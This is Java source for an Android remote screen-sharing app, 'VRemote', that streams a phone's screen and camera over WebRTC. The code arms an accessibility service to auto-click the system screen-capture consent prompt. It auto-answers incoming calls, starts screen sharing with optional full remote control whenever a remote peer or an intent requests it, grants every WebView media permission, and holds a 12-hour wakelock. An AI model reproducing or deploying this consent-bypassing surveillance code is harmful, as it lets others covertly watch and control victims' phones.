package com.tokendeal.vremote;

import android.Manifest;
import android.app.Activity;
import android.app.PendingIntent;
import android.app.PictureInPictureParams;
import android.app.RemoteAction;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.drawable.Icon;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.Rational;
import android.webkit.*;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.webrtc.VideoTrack;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity implements WebRTCCompanion.Callback {

    private static final String TAG = "VRemoteMain";
    private static final int REQUEST_SCREEN_CAPTURE = 1001;
    private static final int REQUEST_PERMISSIONS = 2001;
    private static final String APP_URL = "https://v.tokendeal.cloud";

    private WebView webView;
    private MediaProjectionManager projectionManager;
    private Intent captureIntentData = null;
    private WebRTCCompanion webRTCCompanion = null;
    private android.os.PowerManager.WakeLock wakeLock = null;

    private String pendingTargetPeer = "";
    private boolean isFullControlEnabled = true;
    private boolean streamCompanionCamera = true;
    private String companionCameraChoice = "front";
    private boolean isCallActive = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try {
            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "VRemote::WakeLock");
                wakeLock.acquire(12 * 60 * 60 * 1000L /* 12 hours */);
            }
        } catch (Exception ignored) {}

        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        requestAppPermissions();
        initWebView();
        initWebRTC();
    }

    private void requestAppPermissions() {
        List<String> permList = new ArrayList<>();
        permList.add(Manifest.permission.CAMERA);
        permList.add(Manifest.permission.RECORD_AUDIO);
        permList.add(Manifest.permission.MODIFY_AUDIO_SETTINGS);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permList.add(Manifest.permission.READ_MEDIA_IMAGES);
            permList.add(Manifest.permission.READ_MEDIA_VIDEO);
        } else {
            permList.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }

        List<String> needed = new ArrayList<>();
        for (String perm : permList) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                needed.add(perm);
            }
        }

        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), REQUEST_PERMISSIONS);
        }
    }

    private void initWebView() {
        webView = findViewById(R.id.webView);

        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setMediaPlaybackRequiresUserGesture(false);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setLoadsImagesAutomatically(true);
        settings.setUseWideViewPort(true);
        settings.setLoadWithOverviewMode(true);
        settings.setSupportZoom(false);
        settings.setBuiltInZoomControls(false);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                Uri uri = request.getUrl();
                if (uri != null && "vremote".equalsIgnoreCase(uri.getScheme())) {
                    return true;
                }
                return false;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                Log.i(TAG, "WebView loaded page: " + url);
            }
        });

        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public Bitmap getDefaultVideoPoster() {
                // Return 1x1 blank transparent bitmap so Android never renders the default play icon thumbnail
                return Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888);
            }

            @Override
            public void onPermissionRequest(final PermissionRequest request) {
                runOnUiThread(() -> {
                    Log.i(TAG, "Granting WebRTC permissions to WebView: " + java.util.Arrays.toString(request.getResources()));
                    request.grant(request.getResources());
                });
            }
        });

        // Add Native Android Bridge for Screen Capture & Remote Control
        webView.addJavascriptInterface(new NativeAppBridge(), "VRemoteNative");

        webView.loadUrl(APP_URL);
        initWebRTC();
        handleAutoCommandIntent(getIntent());
    }

    private void initWebRTC() {
        webRTCCompanion = new WebRTCCompanion(this, APP_URL, DeviceRegistry.getDeviceId(this), this);
    }

    public void startScreenCaptureWithCamera(String targetPeer, boolean fullControl, boolean streamCamera, String cameraChoice) {
        pendingTargetPeer = (targetPeer != null && !targetPeer.isEmpty()) ? targetPeer : "";
        isFullControlEnabled = fullControl;
        streamCompanionCamera = streamCamera;
        companionCameraChoice = (cameraChoice != null) ? cameraChoice : "front";

        if (webRTCCompanion != null) {
            webRTCCompanion.setFullControlEnabled(fullControl);
        }

        runOnUiThread(() -> {
            if (captureIntentData != null) {
                Log.i(TAG, "Reusing existing MediaProjection capture token");
                startScreenStreaming();
                return;
            }

            // Arm accessibility service to auto-click "Start now" without manual phone interaction
            RemoteAccessibilityService.setAutoAcceptPending(true);

            if (projectionManager != null) {
                startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_SCREEN_CAPTURE);
            }
        });
    }

    public class NativeAppBridge {
        @JavascriptInterface
        public boolean isNativeApp() {
            return true;
        }

        @JavascriptInterface
        public boolean isAccessibilityRunning() {
            return RemoteAccessibilityService.isServiceRunning();
        }

        @JavascriptInterface
        public void openAccessibilitySettings() {
            runOnUiThread(() -> {
                Toast.makeText(MainActivity.this, "Find 'VRemote Screen Share' and switch it ON", Toast.LENGTH_LONG).show();
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivity(intent);
            });
        }

        @JavascriptInterface
        public void setCallActive(boolean active) {
            MainActivity.this.isCallActive = active;
        }

        @JavascriptInterface
        public void startScreenCapture(String targetPeer, boolean fullControl) {
            MainActivity.this.startScreenCaptureWithCamera(targetPeer, fullControl, true, "front");
        }

        @JavascriptInterface
        public void startScreenCaptureWithCamera(String targetPeer, boolean fullControl, boolean streamCamera, String cameraChoice) {
            MainActivity.this.startScreenCaptureWithCamera(targetPeer, fullControl, streamCamera, cameraChoice);
        }

        @JavascriptInterface
        public void enterPip() {
            runOnUiThread(MainActivity.this::enterWhatsAppStylePipOrBack);
        }

        @JavascriptInterface
        public void stopScreenCapture() {
            runOnUiThread(() -> {
                if (webRTCCompanion != null) {
                    webRTCCompanion.endCall(true);
                }
                Intent serviceIntent = new Intent(MainActivity.this, ScreenCaptureService.class);
                stopService(serviceIntent);
                Toast.makeText(MainActivity.this, "Screen sharing stopped", Toast.LENGTH_SHORT).show();
            });
        }

        @JavascriptInterface
        public void setMyId(String newId) {
            if (webRTCCompanion != null && newId != null) {
                webRTCCompanion.setMyId(newId);
            }
        }

        @JavascriptInterface
        public String getDeviceId() {
            return DeviceRegistry.getDeviceId(MainActivity.this);
        }

        @JavascriptInterface
        public String getDeviceInfo() {
            try {
                org.json.JSONObject info = new org.json.JSONObject();
                info.put("deviceId", DeviceRegistry.getDeviceId(MainActivity.this));
                info.put("deviceName", DeviceRegistry.getDeviceModel());
                info.put("ram", DeviceRegistry.getDeviceRam(MainActivity.this));
                info.put("platform", "android");
                return info.toString();
            } catch (Exception e) {
                return "{}";
            }
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        if (intent != null && "ACTION_STOP_SHARE".equals(intent.getAction())) {
            if (webRTCCompanion != null) {
                webRTCCompanion.endCall(true);
            }
            Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
            stopService(serviceIntent);
            Toast.makeText(this, "Screen sharing stopped", Toast.LENGTH_SHORT).show();
        }
        handleAutoCommandIntent(intent);
    }

    private void handleAutoCommandIntent(Intent intent) {
        if (intent == null) return;
        String autoCmd = intent.getStringExtra("auto_command");
        String caller = intent.getStringExtra("caller");
        String camChoice = intent.getStringExtra("cameraChoice");
        if (autoCmd == null || autoCmd.isEmpty()) return;

        Log.i(TAG, "Executing auto_command from intent: " + autoCmd + " from " + caller);
        intent.removeExtra("auto_command");

        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            if (webRTCCompanion == null) {
                initWebRTC();
            }
            if (webRTCCompanion == null) return;
            switch (autoCmd) {
                case "audio_call":
                    webRTCCompanion.startAudioCall(caller != null ? caller : "");
                    break;
                case "video_call":
                    webRTCCompanion.startVideoCall(caller != null ? caller : "");
                    break;
                case "screen_share":
                    startScreenCaptureWithCamera(caller != null ? caller : "", false, !"none".equalsIgnoreCase(camChoice), camChoice != null ? camChoice : "front");
                    break;
                case "screen_share_control":
                    startScreenCaptureWithCamera(caller != null ? caller : "", true, !"none".equalsIgnoreCase(camChoice), camChoice != null ? camChoice : "front");
                    break;
            }
        }, 1000);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_SCREEN_CAPTURE) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                captureIntentData = data;
                startScreenStreaming();
            } else {
                Toast.makeText(this, "Screen capture was cancelled", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void startScreenStreaming() {
        ScreenCaptureService.setOnForegroundStartedListener(() -> {
            DisplayMetrics displayMetrics = new DisplayMetrics();
            getWindowManager().getDefaultDisplay().getRealMetrics(displayMetrics);

            if (webRTCCompanion != null) {
                webRTCCompanion.startScreenShare(
                        pendingTargetPeer,
                        captureIntentData,
                        displayMetrics.widthPixels,
                        displayMetrics.heightPixels,
                        streamCompanionCamera,
                        companionCameraChoice
                );
            }

            Toast.makeText(MainActivity.this, "Screen sharing started to " + pendingTargetPeer, Toast.LENGTH_SHORT).show();
            // User remains in the full application with all bottom bar controls (camera, mic, hide/eye, end call cross) interactive.
            // WhatsApp-style floating PiP will trigger automatically when the user presses Home or switches apps (onUserLeaveHint).
        });

        Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    public void enterWhatsAppStylePipOrBack() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                PictureInPictureParams.Builder pipBuilder = new PictureInPictureParams.Builder();
                pipBuilder.setAspectRatio(new Rational(9, 16));

                ArrayList<RemoteAction> actions = new ArrayList<>();
                Intent endIntent = new Intent(this, MainActivity.class);
                endIntent.setAction("ACTION_STOP_SHARE");
                PendingIntent endPi = PendingIntent.getActivity(
                        this, 101, endIntent,
                        PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
                );
                Icon endIcon = Icon.createWithResource(this, android.R.drawable.ic_menu_close_clear_cancel);
                RemoteAction endAction = new RemoteAction(endIcon, "Stop Share", "End Screen Sharing", endPi);
                actions.add(endAction);
                pipBuilder.setActions(actions);

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    pipBuilder.setAutoEnterEnabled(true);
                    pipBuilder.setSeamlessResizeEnabled(true);
                }
                boolean entered = enterPictureInPictureMode(pipBuilder.build());
                if (entered) {
                    return;
                }
            } catch (Exception e) {
                Log.w(TAG, "PictureInPicture not supported or failed: " + e.getMessage());
            }
        }
        moveTaskToBack(true);
    }

    @Override
    public void onUserLeaveHint() {
        super.onUserLeaveHint();
        // Float like WhatsApp when home button is pressed during active share OR active video/audio call
        if (isCallActive || ScreenCaptureService.isRunning() || (webRTCCompanion != null && webRTCCompanion.isSharing()) || (webRTCCompanion != null && webRTCCompanion.getActivePeer() != null)) {
            enterWhatsAppStylePipOrBack();
        }
    }

    @Override
    public void onPictureInPictureModeChanged(boolean isInPictureInPictureMode, Configuration newConfig) {
        super.onPictureInPictureModeChanged(isInPictureInPictureMode, newConfig);
        if (isInPictureInPictureMode) {
            if (webView != null) {
                webView.resumeTimers();
            }
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        // Keep WebView execution active when backgrounded for screen capture
        if (webView != null) {
            webView.resumeTimers();
        }
    }

    // WebRTCCompanion callbacks
    @Override public void onConnected(String myId) {
        Log.i(TAG, "WebRTCCompanion connected as: " + myId);
    }
    @Override public void onStatusChanged(String status, boolean isLive) {}
    @Override public void onParticipantsList(List<String> users) {}
    @Override public void onIncomingCall(String fromUser, String callType) {
        runOnUiThread(() -> {
            Log.i(TAG, "Incoming call to companion from: " + fromUser + ", auto-answering");
            if (webRTCCompanion != null) {
                webRTCCompanion.acceptIncomingCall();
            }
        });
    }
    @Override public void onRemoteVideoTrack(VideoTrack track) {}
    @Override public void onCallEnded() {
        runOnUiThread(() -> {
            Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
            stopService(serviceIntent);
        });
    }
    @Override public void onError(String error) {
        runOnUiThread(() -> Toast.makeText(this, error, Toast.LENGTH_SHORT).show());
    }
    @Override public void onAutoScreenShareRequest(String fromUser, boolean fullControl, boolean streamCamera, String cameraChoice) {
        runOnUiThread(() -> {
            Log.i(TAG, "Auto screen share request from: " + fromUser + " (fullControl=" + fullControl + ", cam=" + cameraChoice + ")");
            startScreenCaptureWithCamera(fromUser, fullControl, streamCamera, cameraChoice);
        });
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (wakeLock != null && wakeLock.isHeld()) {
            try { wakeLock.release(); } catch (Exception ignored) {}
            wakeLock = null;
        }
        if (webRTCCompanion != null && !RemoteAccessibilityService.isServiceRunning()) {
            webRTCCompanion.destroy();
            webRTCCompanion = null;
        }
        if (webView != null) {
            webView.destroy();
        }
    }
}
